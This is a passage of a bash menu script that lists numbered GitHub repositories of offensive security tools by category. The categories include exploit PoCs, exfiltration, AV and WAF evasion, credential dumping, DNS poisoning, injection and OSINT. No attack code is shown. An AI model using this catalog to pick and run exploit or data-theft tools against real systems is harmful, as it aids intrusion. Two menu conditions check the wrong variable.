		Stampa " 2414. dirkjanm/CVE-2020-1472" "2421. twistlock/RunC-CVE-2019-5736" "2428. jas502n/CVE-2019-12384"
		Stampa " 2488. shadowgatt/CVE-2019-19356" "2530. ButrintKomoni/cve-2020-0796" "2531. jiansiting/CVE-2020-0796"
		Stampa " 2532. ZecOps/CVE-2020-0796-RCE-POC" "2495. cube0x0/CVE-2021-1675" "2627. fullhunt/log4j-scan"
		Stampa " 2628. kozmer/log4j-shell-poc"
		echo "$SEP"
	fi
	echo "$CBG"" BG. D"
	if [[ "$CBG" == "[-]" ]];
	then
		Stampa " 1090. dlang-community/D-Scanner"
		echo "$SEP"
	fi
	echo "$CBH"" BH. DATABASES"
	if [[ "$CBH" == "[-]" ]];
	then
		Stampa " 1421. woj-ciech/LeakLooker" "1490. evanmiller/mdbtools" "1531. BlackArch/msfdb"
		echo "$SEP"
	fi
	echo "$CBI"" BI. DEBUGGING - DECOMPILING"
	if [[ "$CBI" == "[-]" ]];
	then
		Stampa " 144. snare/voltron" "125. detailyang/readelf" "222. vivisect/vivisect"
		Stampa " 223. unicorn-engine/unicorn" "848. icsharpcode/AvaloniaILSpy" "882. Vector35/binaryninja-python"
		Stampa " 926. Konloch/bytecode-viewer" "1030. 0xd4d/de4dot" "1106. iGio90/Dwarf"
		Stampa " 1113. eteran/edb-debugger" "1164. fesh0r/fernflower" "1209. cs01/gdbgui"
		Stampa " 1367. skylot/jadx" "1371. kwart/jd-cli" "1377. jindrapetrik/jpexs-decompiler"
		Stampa " 1466. deathmarine/Luyten"
		echo "$SEP"
	fi
	echo "$CBJ"" BJ. DECRYPTING"
	if [[ "$CBJ" == "[-]" ]];
	then
		Stampa " 332. Ciphey/Ciphey"
		echo "$SEP"
	fi
	echo "$CBK"" BK. DIRBUSTERING"
	if [[ "$CBK" == "[-]" ]];
	then
		Stampa " 54. aboul3la/Sublist3r" "411. H4ckForJob/dirmap" "774. nccgroup/dirble"
		Stampa " 1050. digination/dirbuster-ng" "1052. Cillian-Collins/dirscraper" "1053. maurosoria/dirsearch"
		Stampa " 1054. stefanoj3/dirstalk"
		echo "$SEP"
	fi
	echo "$CBL"" BL. DISASSEMBLING"
	if [[ "$CBL" == "[-]" ]];
	then
		Stampa " 216. gdbinit/MachOView" "217. cseagle/fREedom" "218. google/binnavi"
		Stampa " 336. sciencemanx/x86-analysis" "340. wisk/medusa" "341. REDasmOrg/REDasm"
		Stampa " 337. cryptator/assembly-code-analysis" "338. plasma-disassembler/plasma" "339. cea-sec/miasm"
		Stampa " 342. vivisect/vivisect" "791. MITRECND/abcd" "948. 0xbc/chiasm-shell"
		Stampa " 1055. gdabah/distorm" "948. 0xbc/chiasm-shell" "1482. ApertureLabsLtd/marc4dasm"
		echo "$SEP"
	fi
	echo "$CBM"" BM. DISCOVERING"
	if [[ "$CBM" == "[-]" ]];
	then
		Stampa " 559. epi052/feroxbuster" "573. robre/scripthunter" "729. chris408/ct-exposer"
		Stampa " 736. gotr00t0day/VulnBanner" "760. fnk0c/cangibrina" "795. sahakkhotsanyan/adfind"
		Stampa " 139. OWASP/cwe-tool" "2440. assetnote/kiterunner" "2491. edoardottt/cariddi"
		Stampa " 1446. GerbenJavado/LinkFinder"
		echo "$SEP"
	fi
	echo "$CBN"" BN. DNS - DOMAIN - VIRTUAL HOST"
	if [[ "$CBN" == "[-]" ]];
	then
		Stampa " 30. m57/dnsteal" "31. skelsec/jackdaw" "35. projectdiscovery/dnsprobe"
		Stampa " 88. m57/dnsteal" "269. dariusztytko/vhosts-sieve" "286. iphelix/dnschef"
		Stampa " 335. mschwager/fierce" "464. fwaeytens/dnsenum" "491. TeamFoxtrot-GitHub/DNSMap"
		Stampa " 492. darkoperator/dnsrecon" "493. neiltyagi/DNSRECON" "496. rs/dnstrace"
		Stampa " 497. redsift/dnstrace" "498. dkorunic/dnstrace" "528. mfocuz/DNS_Hunter"
		Stampa " 752. theMiddleBlue/DNSenum" "753. rbsec/dnscan" "1057. lorenzog/dns-parallel-prober"
		Stampa " 783. gr3yc4t/dns-poisoning-tool" "784. SemyonMakhaev/dns-poison" "1506. daehee/mildew"
		Stampa " 785. ShanjinurIslam/Computer-Security-DNS-Cache-Poisoning"
		Stampa " 799. blark/aiodnsbrute" "803. infosec-au/altdns" "831. tomnomnom/assetfinder"
		Stampa " 945. projectdiscovery/chaos-client" "1063. erbbysam/DNSGrep" "2293. ProjectAnte/dnsgen"
		Stampa " 1065. evilsocket/dnssearch" "1066. elceef/dnstwist" "1067. vortexau/dnsvalidator"
		Stampa " 1068. projectdiscovery/dnsx" "1070. MarkBaggett/domain_stats" "2306. tismayil/rsdl"
		Stampa " 2401. A3h1nt/Subcert" "2402. r3curs1v3-pr0xy/sub404" "2432. eslam3kl/crtfinder"
		Stampa " 1165. stealth/fernmelder" "1173. Edu4rdSHL/findomain" "1190. kirei/fpdns"
		Stampa " 1235. zombiesam/googlesub" "1269. hakluke/hakrevdns" "1374. utkusen/jeopardize"
		Stampa " 1407. guelfoweb/knock" "1487. blechschmidt/massdns" "1492. chadillac/mdns_recon"
		Stampa " 1525. waytoalpit/ManOnTheSideAttack-DNS-Spoofing" "1549. PentesterES/Necromant"
		echo "$SEP"
	fi
	echo "$CBO"" BO. DOCKER"
	if [[ "$CBO" == "[-]" ]];
	then
		Stampa " 351. cr0hn/dockerscan" "352. RhinoSecurityLabs/ccat" "2420. kost/dockscan"
		Stampa " 2482. Ullaakut/Gorsair"
		echo "$SEP"
	fi
	echo "$CBP"" BP. DRUPAL"
	if [[ "$CBP" == "[-]" ]];
	then
		Stampa " 1088. Tethik/drupal-module-enumeration" "1089. immunIT/drupwn"
		echo "$SEP"
	fi
	echo "$CBQ"" BQ. DUMPING - EXTRACTING - RIPPING"
	if [[ "$CBQ" == "[-]" ]];
	then
		Stampa " 121. AlessandroZ/LaZagne" "170. sevagas/swap_digger" "49. Greenwolf/ntlm_theft"
		Stampa " 197. sowdust/pdfxplr" "213. Arno0x/NtlmRelayToEWS" "221. 504ensicsLabs/LiME"
		Stampa " 285. louisabraham/ffpass" "294. TryCatchHCF/Cloakify" "441. laramies/metagoofil"
		Stampa " 533. securing/DumpsterDiver" "862. deepzec/Bad-Pdf" "1110. brav0hax/easy-creds"
		Stampa " 879. mazen160/bfac" "880. tmbinc/bgrep" "1021. itsmehacker/DarkScrape"
		Stampa " 1101. 0verl0ad/Dumb0" "1105. kost/dvcs-ripper" "2429. ifsnop/mysqldump-php"
		Stampa " 1142. bwall/ExtractHosts" "1196. Nightbringer21/fridump" "1301. hasherezade/hollows_hunter"
		Stampa " 1442. kd8bny/LiMEaide"
		echo "$SEP"
	fi
	echo "$CBR"" BR. EDITOR"
	if [[ "$CBR" == "[-]" ]];
	then
		Stampa " 894. afrantzis/bless"
		echo "$SEP"
	fi
	echo "$CBS"" BS. ENUMERATION"
	if [[ "$CBS" == "[-]" ]];
	then
		Stampa " 163. luke-goddard/enumy" "209. Knowledge-Wisdom-Understanding/recon"
		Stampa " 619. cddmp/enum4linux-ng" "735. gotr00t0day/oswalkpy" "840. skahwah/automato"
		Stampa " 1007. m8r0wn/crosslinked" "1033. SpiderLabs/deblaze" "1072. vysecurity/DomLink"
		Stampa " 1096. anantshri/DS_Store_crawler_parser" "1121. dejanlevaja/enum_shares"
		Stampa " 2546. santiko/KnockPy" "1361. lavalamp-/ipv666" "1365. salesforce/ja3"
		Stampa " 1392. hotelzululima/kacak" "1423. carlospolop/legion" "2629. SecuProject/ADenum"
		Stampa " 1532. wez3/msfenum"
		echo "$SEP"
	fi
	echo "$CBT"" BT. EVASION - BYPASSING - OBFUSCATION"
	if [[ "$CBT" == "[-]" ]];
	then
		Stampa " 167. govolution/avet" "134. khalilbijjou/WAFNinja" "174. stormshadow07/HackTheWorld"
		Stampa " 268. wintrmvte/SNOWCRASH" "275. CBHue/PyFuscation" "293. OsandaMalith/PE2HTML"
		Stampa " 309. mdsecactivebreach/Chameleon" "576. Veil-Framework/Veil" "605. shadowlabscc/Kaiten"
		Stampa " 688. lobuhi/byp4xx" "731. gotr00t0day/forbiddenpass" "792. LandGrey/abuse-ssl-bypass-waf"
		Stampa " 824. tokyoneon/Armor" "869. Bashfuscator/Bashfuscator" "925. vincentcox/bypass-firewalls-by-DNS-history"
		Stampa " 944. TarlogicSecurity/Chankro" "953. epsylon/cintruder" "956. frohoff/ciphr"
		Stampa " 965. trycatchhcf/cloakify" "1036. nccgroup/demiguise" "1081. D4Vinci/Dr0p1t-Framework"
		Stampa " 2356. Mr-Un1k0d3r/UniByAv" "2355. paranoidninja/CarbonCopy" "2389. samhaxr/AnonX"
		Stampa " 1134. OsandaMalith/Exe2Image" "2463. d4rckh/vaf" "2462. FunnyWolf/pystinger"
		Stampa " 1200. lostincynicism/FuzzAP" "1248. Ekultek/Graffiti" "2478. asaurusrex/Forblaze"
		Stampa " 2496. mhaskar/DNSStager" "2525. h4wkst3r/InvisibilityCloak" "2535. WazeHell/LightMe"
		Stampa " 1285. HatBashBR/HatCloud" "1347. Hnfull/Intensio-Obfuscator" "1360. milo2012/ipv4Bypass"
		Stampa " 1381. zigoo0/JSONBee" "1498. a0rtega/metame"
		echo "$SEP"
	fi
	echo "$CBU"" BU. EXCHANGE"
	if [[ "$CBU" == "[-]" ]];
	then
		Stampa " 571. sensepost/ruler" "2351. dirkjanm/PrivExchange" "2404. RickGeex/ProxyLogon"
		Stampa " 2554. dmaasland/proxyshell-poc"
		echo "$SEP"
	fi
	echo "$CBV"" BV. EXFILTRATION"
	if [[ "$CBV" == "[-]" ]];
	then
		Stampa " 314. danielwolfmann/Invoke-WordThief/logger" "593. TryCatchHCF/PacketWhisper" "2444. foofus-sph1nx/PyMailSniper"
		Stampa " 2479. antman1p/GDir-Thief"
		echo "$SEP"
	fi
	echo "$CBW"" BW. EXPLOIT"
	if [[ "$CBW" == "[-]" ]];
	then
		Stampa " 10. exploit-db/linux - remote scripts" "11. exploit-db/linux_x86 - remote scripts" "12. exploit-db/linux_x86-64 - remote scripts"
		Stampa " 13. exploit-db/windows - remote scripts" "14. exploit-db/windows_x86 - remote scripts" "15. exploit-db/windows_x86-64 - remote scripts"
		Stampa " 16. sundaysec/Android-Exploits/remote" "17. offensive-security/exploitdb/android/remote"
		Stampa " 18. offensive-security/exploitdb/ios remote exploits" "617. Download an exploit from exploit-db site web"
		Stampa " 815. Acey9/Chimay-Red" "846. NullArray/AutoSploit" "19. all remote exploits from offensive-security/exploitdb"
		Stampa " 1071. coldfusion39/domi-owned" "2331. offensive-security/exploitdb" "1213. vulnersCom/getsploit"
		Stampa " 2386. Download impacket's tools" "2443. System00-Security/Git-Cve" "1488. jm33-m0/mec"
		Stampa " 2509. intrd/nozzlr" "2510. hellman/libformatstr" "2511. david942j/one_gadget"
		echo "$SEP"
	fi
	echo "$CBX"" BX. EXTRA - EXTENSIONS"
	if [[ "$CBX" == "[-]" ]];
	then
		Stampa " 252. LionSec/katoolin" "1177. mazen160/Firefox-Security-Toolkit"
		echo "$SEP"
	fi
	echo "$CBY"" BY. FACEBOOK"
	if [[ "$CBY" == "[-]" ]];
	then
		Stampa " 1148. tomoneill19/facebookOSINT" "1149. pun1sh3r/facebot" "1150. PowerScript/facebrok"
		Stampa " 1151. emerinohdz/FaceBrute" "1159. chinoogawa/fbht"
		Stampa " 1160. xHak9x/fbi" "1161. guelfoweb/fbid"
		echo "$SEP"
	fi
	echo "$CBZ"" BZ. FILE - SYSTEM"
	if [[ "$CBZ" == "[-]" ]];
	then
		Stampa " 446. aarsakian/MFTExtractor"
		echo "$SEP"
	fi
	echo "$CCA"" CA. FINGER"
	if [[ "$CCA" == "[-]" ]];
	then
		Stampa " 609. pentestmonkey/finger-user-enum"
		echo "$SEP"
	fi
	echo "$CCB"" CB. FOOTPRINTING - FINGERPRINTING"
	if [[ "$CCB" == "[-]" ]];
	then
		Stampa " 132. Zarcolio/sitedorks" "133. s0md3v/photon" "276. m3n0sd0n4ld/uDork"
		Stampa " 414. hhhrrrttt222111/Dorkify" "415. Chr0m0s0m3s/DeadTrap" "420. techgaun/github-dorks"
		Stampa " 531. CERT-Polska/hfinger" "581. EnableSecurity/wafw00f" "779. ethicalhackingplayground/dorkX"
		Stampa " 781. E4rr0r4/XGDork" "854. aliasrobotics/aztarna" "884. Hood3dRob1n/BinGoo"
		Stampa " 1539. falcon-lnhg/mwebfp" "1552. PherricOxide/Neighbor-Cache-Fingerprinter"
		echo "$SEP"
	fi
	echo "$CCC"" CC. FREQUENCY"
	if [[ "$CCC" == "[-]" ]];
	then
		Stampa " 1534. EliasOenal/multimon-ng"
		echo "$SEP"
	fi
	echo "$CCD"" CD. FTP"
	if [[ "$CCD" == "[-]" ]];
	then
		Stampa " 147. WalderlanSena/ftpbrute" "149. AlphaRoy14/km985ytv-ftp-exploit"
		Stampa " 150. GitHackTools/FTPBruter" "151. DevilSquidSecOps/FTP" "154. pentestmonkey/ftp-user-enum"
		Stampa " 175. jtpereyda/boofuzz-ftp/ftp"
		echo "$SEP"
	fi
	echo "$CCE"" CE. FUZZING"
	if [[ "$CCE" == "[-]" ]];
	then
		Stampa " 34. devanshbatham/ParamSpider" "56. jtpereyda/boofuzz" "50. fuzzdb-project/fuzzdb"
		Stampa " 130. google/AFL" "72. corelan/mona" "73. OpenRCE/sulley"
		Stampa " 465. wireghoul/dotdotpwn" "517. dwisiswant0/crlfuzz" "597. googleprojectzero/fuzzilli"
		Stampa " 687. renatahodovan/grammarinator" "686. nccgroup/fuzzowski" "685. OblivionDev/fuzzdiff"
		Stampa " 684. nol13/fuzzball" "683. k0retux/fuddly" "682. nccgroup/FrisbeeLite"
		Stampa " 681. zznop/flyr" "680. wireghoul/doona" "679. googleprojectzero/domato"
		Stampa " 678. ernw/dizzy" "677. MozillaSecurity/dharma" "675. hadoocn/conscan"
		Stampa " 674. dobin/ffw" "673. CENSUS/choronzon" "672. RootUp/BFuzz"
		Stampa " 671. localh0t/backfuzz" "670. doyensec/ajpfuzzer" "702. HSASec/ProFuzz"
		Stampa " 689. savio-code/hexorbase" "690. nccgroup/Hodor" "691. google/honggfuzz"
		Stampa " 692. tehmoon/http-fuzzer" "693. andresriancho/websocket-fuzzer" "694. twilsonb/jbrofuzz"
		Stampa " 695. cisco-sas/kitty" "696. mxmssh/manul" "697. IOActive/Melkor_ELF_Fuzzer"
		Stampa " 698. mazzoo/ohrwurm" "699. MozillaSecurity/peach" "700. calebstewart/peach"
		Stampa " 701. marcinguy/powerfuzzer" "703. hgascon/pulsar" "2442. denandz/fuzzotron"
		Stampa " 704. mseclab/PyJFuzz" "705. akihe/radamsa" "707. Battelle/sandsifter"
		Stampa " 708. mfontanini/sloth-fuzzer" "709. nopper/archpwn" "711. landw1re/socketfuzz"
		Stampa " 712. allfro/sploitego" "715. rsmusllp/termineter" "716. droberson/thefuzz"
		Stampa " 717. kernelslacker/trinity" "718. PAGalaxyLab/uniFuzzer" "720. nullsecuritynet/uniofuzz"
		Stampa " 721. andresriancho/w3af" "723. wereallfeds/webshag" "724. samhocevar/zzuf"
		Stampa " 798. tintinweb/aggroArgs" "2334. lcamtuf.coredump/afl" "1166. ffuf/ffuf"
		Stampa " 1168. henshin/filebuster" "2468. intrudir/403fuzzer" "1189. Owlz/formatStringExploiter"
		Stampa " 1201. mdiazcl/fuzzbunch-debian" "1252. trailofbits/grr" "2528. AFLplusplus/AFLplusplus"
		Stampa " 2555. junegunn/fzf" "1300. nccgroup/hodor" "2600. s41r4j/phomber"
		Stampa " 1341. BountyStrike/Injectus"
		echo "$SEP"
	fi
	echo "$CCF"" CF. GATHERING - OSINT - DOXING"
	if [[ "$CCF" == "[-]" ]];
	then
		Stampa " 168. Screetsec/Sudomy" "177. HightechSec/git-scanner/gitscanner" "89. urbanadventurer/WhatWeb"
		Stampa " 215. evanmiller/hecate" "246. danieleperera/OnionIngestor" "248. evyatarmeged/Raccoon"
		Stampa " 300. laramies/theHarvester" "306. lockfale/OSINT-Framework" "307. Netflix-Skunkworks/Scumblr"
		Stampa " 315. M0tHs3C/Hikxploit" "316. sundowndev/PhoneInfoga" "358. intelowlproject/IntelOwl"
		Stampa " 364. opsdisk/pagodo" "179. BullsEye0/shodan-eye" "470. HatBashBR/ShodanHat"
		Stampa " 472. random-robbie/My-Shodan-Scripts" "474. m4ll0k/Shodanfy.py" "1453. lulz3xploit/LittleBrother"
		Stampa " 477. gelim/censys" "478. twelvesec/gasmask" "476. sdnewhop/grinder"
		Stampa " 486. sowdust/tafferugli" "537. adnane-X-tebbaa/Katana" "555. m8r0wn/subscraper"
		Stampa " 560. Datalux/Osintgram" "585. thewhiteh4t/FinalRecon" "588. AzizKpln/Moriarty-Project"
		Stampa " 589. mxrch/GHunt" "613. bdblackhat/admin-panel-finder" "625. TermuxHacking000/phonia"
		Stampa " 631. Anon-Exploiter/SiteBroker" "646. nandydark/grim" "653. adnane-X-tebbaa/GRecon"
		Stampa " 725. alpkeskin/mosint" "730. gotr00t0day/IGF" "734. gotr00t0day/subdomainbrute"
		Stampa " 778. ethicalhackingplayground/SubNuke" "881. GitHackTools/BillCipher" "936. packetassailant/catnthecanary"
		Stampa " 935. itsmehacker/CardPwn" "138. OWASP/Amass" "2259. nitefood/asn"
		Stampa " 1002. lightos/credmap" "1005. ilektrojohn/creepy" "1042. DanMcInerney/device-pharmer"
		Stampa " 1076. utiso/dorkbot" "1077. blueudp/DorkMe" "1078. NullArray/DorkNet"
		Stampa " 1118. martinvigo/email2phonenumber" "2302. josh0xA/darkdump" "2314. FortyNorthSecurity/Just-Metadata"
		Stampa " 2316. davidtavarez/pwndb" "2326. j3ers3/Searpy" "1628. behindthefirewalls/Parsero"
		Stampa " 2352. bhavsec/reconspider" "2376. caffix/amass" "2406. an00byss/godehashed"
		Stampa " 845. bharshbarger/AutOSINT" "875. aancw/Belati" "2294. pixelbubble/ProtOSINT"
		Stampa " 2345. SharadKumar97/OSINT-SPY" "2439. matamorphosis/Scrummage" "1182. galkan/flashlight"
		Stampa " 1187. byt3smith/Forager" "1240. Nhoya/gOSINT" "1271. Te-k/harpoon"
		Stampa " 2500. jakejarvis/awesome-shodan-queries" "2501. interference-security/zoomeye-data" "2526. A3h1nt/Grawler"
		Stampa " 2534. sc1341/TikTok-OSINT" "2538. nccgroup/Solitude" "2565. C0MPL3XDEV/E4GL30S1NT"
		Stampa " 2597. DedSecInside/gotor" "2610. xadhrit/terra" "1329. BillyV4/ID-entify"
		Stampa " 1340. m4ll0k/infoga" "1342. penafieljlm/inquisitor" "1344. sc1341/InstagramOSINT"
		Stampa " 1355. Rajkumrdusad/IP-Tracer" "2616. emrekybs/Expulso" "2619. Q0120S/NoobWebHunter"
		Stampa " 1445. initstring/linkedin2username" "1469. HurricaneLabs/machinae" "1483. saeeddhqan/Maryam"
		Stampa " 1497. j3ssie/metabigor" "2644. kennbroorg/iKy" "2645. machine1337/userfinder/osint"
		echo "$SEP"
	fi
	echo "$CCG"" CG. GIT - REPOS"
	if [[ "$CCG" == "[-]" ]];
	then
		Stampa " 487. arthaud/git-dumper" "553. Ebryx/GitDump" "2315. metac0rtex/GitHarvester"
		Stampa " 2422. michenriksen/gitrob" "1216. bahamas10/node-git-dump" "1217. tillson/git-hound"
		Stampa " 1218. obheda12/GitDorker" "1219. mschwager/gitem" "1220. hisxo/gitGraber"
		Stampa " 1221. lijiejie/githack" "1222. mazen160/GithubCloner" "1223. zricethezav/gitleaks"
		Stampa " 1224. giovanifss/gitmails" "1225. danilovazb/GitMiner" "1226. internetwache/GitTools"
		Stampa " 2492. liamg/gitjacker"
		echo "$SEP"
	fi
	echo "$CCH"" CH. GITLAB"
	if [[ "$CCH" == "[-]" ]];
	then
		Stampa " 2407. dotPY-hax/gitlab_RCE"
		echo "$SEP"
	fi
	echo "$CCI"" CI. GOPHER"
	if [[ "$CCI" == "[-]" ]];
	then
		Stampa " 1238. tarunkant/Gopherus"
		echo "$SEP"
	fi
	echo "$CCJ"" CJ. GRAPHQL"
	if [[ "$CCJ" == "[-]" ]];
	then
		Stampa " 1249. swisskyrepo/GraphQLmap"
		echo "$SEP"
	fi
	echo "$CCK"" CK. GSM"
	if [[ "$CCK" == "[-]" ]];
	then
		Stampa " 1394. steve-m/kalibrate-rtl"
		echo "$SEP"
	fi
	echo "$CCM"" CM. GTFO"
	if [[ "$CCM" == "[-]" ]];
	then
		Stampa " 1255. mzfr/gtfo" "1256. nccgroup/GTFOBLookup"
		echo "$SEP"
	fi
	echo "$CCN"" CN. GVM"
	if [[ "$CCN" == "[-]" ]];
	then
		Stampa " 1251. greenbone/gsa" "1257. greenbone/gvmd"
		echo "$SEP"
	fi
	echo "$CCO"" CO. HARDWARE"
	if [[ "$CCO" == "[-]" ]];
	then
		Stampa " 2458. samyk/glitchsink" "1526. iamckn/mousejack_transmit"
		echo "$SEP"
	fi
	echo "$CCP"" CP. HASH"
	if [[ "$CCP" == "[-]" ]];
	then
		Stampa " 2260. cube0x0/HashSpray.py" "2446. MichaelDim02/houndsniff" "1274. iagox86/hash_extender"
		Stampa " 1275. blackploit/hash-identifier" "1281. rurapenthe/hashfind" "1282. psypanda/hashID"
		Stampa " 1283. bwall/HashPump" "1284. SmeegeSec/HashTag"
		echo "$SEP"
	fi
	echo "$CCQ"" CQ. HDCP"
	if [[ "$CCQ" == "[-]" ]];
	then
		Stampa " 1291. rjw57/hdcp-genkey"
		echo "$SEP"
	fi
	echo "$CCR"" CR. HEAP"
	if [[ "$CCR" == "[-]" ]];
	then
		Stampa " 2484. gand3lf/heappy"
		echo "$SEP"
	fi
	echo "$CCS"" CS. HID"
	if [[ "$CCS" == "[-]" ]];
	then
		Stampa " 1396. samratashok/Kautilya"
		echo "$SEP"
	fi
	echo "$CCT"" CT. HIKVISION"
	if [[ "$CCF" == "[-]" ]];
	then
		Stampa " 1298. 4n4nk3/HikPwn"
		echo "$SEP"
	fi
	echo "$CCU"" CU. HOOKING - HIJACKING - INJECTION"
	if [[ "$CCU" == "[-]" ]];
	then
		Stampa " 140. zznop/drow" "173. J3wker/DLLicous-MaliciousDLL" "185. cybercitizen7/Ps1jacker"
		Stampa " 196. thelinuxchoice/spyeye" "353. ujjwal96/njaXt" "354. toxic-ig/SQL-XSS"
		Stampa " 355. swisskyrepo/SSRFmap" "453. zt2/sqli-hunter" "467. JohnTroony/Blisqy"
		Stampa " 518. chinarulezzz/pixload/bmp" "519. chinarulezzz/pixload/gif" "520. chinarulezzz/pixload/jpg"
		Stampa " 521. chinarulezzz/pixload/png" "522. chinarulezzz/pixload/webp" "569. commixproject/commix"
		Stampa " 676. rudSarkar/crlf-injector" "765. infobyte/evilgrade" "802. lanjelot/albatar"
		Stampa " 870. neohapsis/bbqsql" "889. nbshelton/bitdump" "895. libeclipse/blind-sql-bitshifting"
		Stampa " 896. missDronio/blindy" "917. enjoiz/BSQLinjector" "1120. cr0hn/enteletaor"
		Stampa " 1020. BlackArch/darkmysqli" "1032. UndeadSec/Debinject" "2298. the-robot/sqliv"
		Stampa " 2536. dlegs/php-jpeg-injector" "1310. PaulSec/HQLmap" "1334. jklmnn/imagejs"
		Stampa " 1383. ron190/jsql-injection" "1419. sduverger/ld-shatner" "1450. gaffe23/linux-inject"
		Stampa " 1480. z0noxz/mando.me" "1524. kevinkoo001/MotS"
		echo "$SEP"
	fi
	echo "$CCV"" CV. HTTP - HTTP/2"
	if [[ "$CCV" == "[-]" ]];
	then
		Stampa " 1260. summerwind/h2spec" "1313. lijiejie/htpwdScan" "1418. wireghoul/lbmap"
		Stampa " 1519. RedTeamPentesting/monsoon"
		echo "$SEP"
	fi
	echo "$CCW"" CW. IIS"
	if [[ "$CCW" == "[-]" ]];
	then
		Stampa " 22. 0x09AL/IIS-Raid" "23. thelinuxchoice/evilreg" "24. thelinuxchoice/eviloffice"
		Stampa " 25. thelinuxchoice/evildll" "158. gehaxelt/Python-dsstore" "250. edwardz246003/IIS_exploit"
		Stampa " 251. irsdl/IIS-ShortName-Scanner" "2272. srnframe/eviloffice" "2273. 8L4NK/evilreg"
		Stampa " 2275. CrackerCat/evildll" "1331. lijiejie/IIS_shortname_Scanner"
		echo "$SEP"
	fi
	echo "$CCX"" CX. IKE"
	if [[ "$CCX" == "[-]" ]];
	then
		Stampa " 526. 0x90/vpn-arsenal" "726. SpiderLabs/ikeforce" "727. royhills/ike-scan"
		echo "$SEP"
	fi
	echo "$CCY"" CY. IMAP"
	if [[ "$CCY" == "[-]" ]];
	then
		Stampa " 204. byt3bl33d3r/SprayingToolkit" "205. mrexodia/haxxmap" "207. iomoath/IMAP-Cracker"
		Stampa " 2379. kurobeats/fimap" "2649. rm1984/IMAPLoginTester"
		echo "$SEP"
	fi
	echo "$CCZ"" CZ. IMSI"
	if [[ "$CCY" == "[-]" ]];
	then
		Stampa " 387. Oros42/IMSI-catcher" "386. sharyer/GSMEvil/ImsiEvil"
		echo "$SEP"
	fi
	echo "$CDA"" DA. iOS"
	if [[ "$CDA" == "[-]" ]];
	then
		Stampa " 360. tokyoneon/Arcane" "442. Flo354/iOSForensic" "443. as0ler/iphone-dataprotection"
		Stampa " 444. jantrim/iosbackupexaminer" "666. yuejd/ios_Restriction_PassCode_Crack---Python-version"
		Stampa " 864. ChiChou/bagbak" "2286. seemoo-lab/toothpicker" "2308. RealityNet/ios_triage"
		Stampa " 2309. abrignoni/iLEAPP" "1194. AloneMonkey/frida-ios-dump" "1550. mwrlabs/needle"
		echo "$SEP"
	fi
	echo "$CDB"" DB. IoT"
	if [[ "$CDB" == "[-]" ]];
	then
		Stampa " 748. SafeBreach-Labs/SirepRAT" "1302. ElevenPaths/HomePWN"
		echo "$SEP"
	fi
	echo "$CDC"" DC. IPCAM - DVR"
	if [[ "$CDC" == "[-]" ]];
	then
		Stampa " 398. CCrashBandicot/IPCam" "399. nathan242/ipcam-cctv" "400. Benehiko/GoNetworkCameraScanner"
		Stampa " 401. vanpersiexp/expcamera" "656. spicesouls/reosploit" "929. Ullaakut/cameradar"
		Stampa " 2485. EntySec/CamRaptor" "2486. AngelSecurityTeam/Cam-Hackers" "1395. woj-ciech/kamerka"
		echo "$SEP"
	fi
	echo "$CDD"" DD. IPMI"
	if [[ "$CDD" == "[-]" ]];
	then
		Stampa " 1356. AnarchyAngel/IPMIPWN"
		echo "$SEP"
	fi
	echo "$CDE"" DE. IRC"
	if [[ "$CDE" == "[-]" ]];
	then
		Stampa " 1362. bwall/ircsnapshot"
		echo "$SEP"
	fi
	echo "$CDF"" DF. ISCSI"
	if [[ "$CDF" == "[-]" ]];
	then
		Stampa " 2303. bitvijays/Pentest-Scripts/isciadm" "2304. open-iscsi/open-iscsi"
		echo "$SEP"
	fi
	echo "$CDG"" DG. iTUNES"
	if [[ "$CDG" == "[-]" ]];
	then
		Stampa " 665. jos666/itunes_hack"
		echo "$SEP"
	fi
	echo "$CDH"" DH. JAVA"
	if [[ "$CDH" == "[-]" ]];
	then
		Stampa " 227. pxb1988/dex2jar" "346. benf/cfr" "356. java-decompiler/jd-gui"
		Stampa " 2276. qtc-de/remote-method-guesser" "1372. frohoff/jdeserialize"
		echo "$SEP"
	fi
	echo "$CDI"" DI. JBOSS"
	if [[ "$CDI" == "[-]" ]];
	then
		Stampa " 1370. SpiderLabs/jboss-autopwn" "1375. joaomatosf/jexboss"
		echo "$SEP"
	fi
	echo "$CDJ"" DJ. JENKINS"
	if [[ "$CDJ" == "[-]" ]];
	then
		Stampa " 356. gquere/pwn_jenkins"
		echo "$SEP"
	fi
	echo "$CDK"" DK. JOOMLA"
	if [[ "$CDK" == "[-]" ]];
	then
		Stampa " 2335. oppsec/juumla" "1376. black-hawk-97/jooforce"
		echo "$SEP"
	fi
	echo "$CDL"" DL. JWT"
	if [[ "$CDL" == "[-]" ]];
	then
		Stampa " 1389. brendan-rius/c-jwt-cracker" "1390. ticarpi/jwt_tool" "1391. aress31/jwtcat"
		Stampa " 1542. mBouamama/MyJWT"
		echo "$SEP"
	fi
	echo "$CDM"" DM. KERBEROS"
	if [[ "$CDM" == "[-]" ]];
	then
		Stampa " 3. ropnop/kerbrute" "26. TarlogicSecurity/kerbrute" "5. CroweCybersecurity/ad-ldap-enum"
		Stampa " 6. proabiral/inception" "362. nidem/kerberoast" "516. NotMedic/NetNTLMtoSilverTicket/dementor"
		Stampa " 1409. dirkjanm/krbrelayx"
		echo "$SEP"
	fi
	echo "$CDN"" DN. KNX"
	if [[ "$CDN" == "[-]" ]];
	then
		Stampa " 1408. ernw/knxmap"
		echo "$SEP"
	fi
	echo "$CDO"" DO. KUBERNETES"
	if [[ "$CDO" == "[-]" ]];
	then
		Stampa " 374. liggitt/audit2rbac" "375. mhausenblas/kaput" "647. vchinnipilli/kubestrike"
		Stampa " 648. cyberark/KubiScan" "2395. swisskyrepo/PayloadsAllTheThings/Kubernetes"
		Stampa " 2396. Shopify/kubeaudit" "2397. controlplaneio/kubesec" "2398. aquasecurity/kube-bench"
		Stampa " 1410. aquasecurity/kube-hunter" "1411. averonesis/kubolt"
		echo "$SEP"
	fi
	echo "$CDP"" DP. LDAP"
	if [[ "$CDP" == "[-]" ]];
	then
		Stampa " 1. CasperGN/ActiveDirectoryEnumeration" "2. dirkjanm/ldapdomaindump" "4. ropnop/windapsearch"
		Stampa " 64. dinigalab/ldapsearch" "84. 3rdDegree/dapper" "85. m8r0wn/ldap_search"
		Stampa " 728. droope/ldap-brute" "2399. swisskyrepo/PayloadsAllTheThings/LDA_Injection/README"
		Stampa " 1420. franc-pentest/ldeep"
		echo "$SEP"
	fi
	echo "$CDQ"" DQ. LFI"
	if [[ "$CDQ" == "[-]" ]];
	then
		Stampa " 1431. aepereyra/lfimap" "2614. kostas-pa/LFITester" "1430. OsandaMalith/LFiFreak"
